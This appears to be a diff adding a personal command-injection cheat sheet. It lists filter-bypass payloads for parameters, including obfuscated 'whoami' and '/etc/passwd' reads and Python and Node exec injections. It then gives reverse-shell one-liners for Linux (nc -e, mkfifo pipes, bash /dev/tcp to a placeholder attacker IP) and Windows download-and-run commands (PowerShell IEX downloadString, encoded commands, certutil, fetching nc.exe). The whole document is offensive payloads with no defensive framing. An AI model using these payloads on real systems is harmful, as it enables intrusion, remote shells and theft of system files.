@@ -1,0 +1,101 @@
+to bypass filters:
+param=;<cmd>
+param=<cmd>;
+param=;<cmd>;
+param=$(<cmd>)
+param=|<cmd>
+param=__import__(‘os’).system(‘<cmd>’)  
+param=---js\n((require(“child_process”)).execSync(“<cmd>”))\n—
+#3 dashes at the begining and at the end
+param=whoam?
+param=whoam*
+param=whoam[i]
+param=”w”h”o”a”m”i
+param=\w\h\o\a\m\i
+param=whoami$@
+param=whoami | $0
+param=$(tr “[A-Z]” “[a-z]”<<<”whOAmI”)
+param=whoami$u    #uninitialized variable
+param=$’whoami’
+param=cat${HOME:0:1}etc${HOME:0:1}passwd
+param=cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+
+
+
+        
+
+Linux
+
+I can ping myself
+
+I can read the local files
+
+I can get a reverse shell via
+
+                                    Nc –e /bin/bash <my_ip> <port>
+
+                                    Nc –u <my_ip> <port>
+
+                                    Nc –c bash <my_ip> <port>
+
+                                   Rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -I 2>&1|nc <my_ip> <port> > /tmp/f
+
+                                  Bash –c ‘bash -I >& /dev/tcp/<my_ip>/<port> 0>&1’
+
+bash -c ‘(sh)0>/dev/tcp/<attacker_ip>/<attacker_port>
+after getting a shell execute in it 
+
+exec >&0
+
+Base64 encoded version of the above commands
+             
+ Upload shell to the disk  
+
+                                 
+
+If all of those attempts failed it means that there is a firewall in place that is blocking my reverse shells so I need to bypass it
+
+Windows
+
+I can ping myself
+
+I can read the local files
+
+I can get a code execution via:
+
+                                     Powershell IEX(New-Object Net.WebClient).downloadString(‘http:// <my_ip> <port>/shell.ps1’) 
+
+                                                        C:\Windows\SysNative\WindowsPowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString(‘http:// <my_ip> <port>/shell.ps1’
+
+                                  powershell –nop –enc <base64_encoded_IEX_…>
+
+                                 powershell –EncodedCommand <base64_encoded_IEX_…>
+
+                                 Invoke-WebRequest –Uri http:// <my_ip> <port>/shell.ps1
+
+                                 IWR –Uri http:// <my_ip>: <port>/nc.exe -outFile  <destination_where_to_save_file>/nc.exe
+
+                                 Curl http://<my_ip>:<port>/shell.ps1
+
+                                Wget http://<my_ip>:<port>/shell.ps1
+
+                                Cmd /c powershell  IEX(New-Object Net.WebClient).downloadString(‘http:// <my_ip> <port>/shell.ps1’)
+
+                                Via iconv –t (to convert into windows friendly format)
+
+Echo -n “IEX(New-Object Net.WebClient).downloadString(‘http:// <my_ip>:<port>/shell.ps1’)” | iconv –t utf-16le 
+And then copy and paste the result into a vulnerable parameter
+
+
+                                     Via nc.exe
+Systemctl start smbd
+Param=\\<my_ip>\simon\nc.exe -e powershell <my_ip>:<port>
+
+                                   Via certutil
+Certutil –urlcache –split –f http://<my_ip>:<port>/shell.ps1
+
+
+
+If all of those attempts failed it means that there is a firewall in place that is blocking my reverse shells so I need to bypass it
+
+
